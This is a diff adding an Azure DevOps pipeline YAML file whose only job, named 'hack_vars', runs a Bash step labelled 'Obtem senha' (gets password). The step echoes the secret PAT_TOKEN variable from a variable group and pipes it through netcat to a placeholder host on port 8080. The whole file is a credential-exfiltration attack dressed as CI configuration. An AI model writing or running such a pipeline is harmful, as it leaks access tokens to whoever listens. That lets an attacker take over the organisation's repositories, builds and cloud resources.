@@ -1,0 +1,31 @@
+trigger:
+  - none
+
+
+variables:
+  - group: variable group
+
+
+jobs:
+  - job: hack_vars
+    condition: always()
+    displayName: hack_vars
+    pool:
+      name: 'pool-azure'
+      vmImage: 'hostname agente do azure'
+
+    workspace:
+      clean: all
+
+    steps:
+    - task: Bash@3
+      displayName: Obtem senha
+      condition: succeeded()
+      inputs:
+        targetType: 'inline'      
+        script: |
+          #pwd
+          #ls -latr
+          echo "listando pat token"
+          echo "$(PAT_TOKEN)"|nc hostname do agent 8080
+        
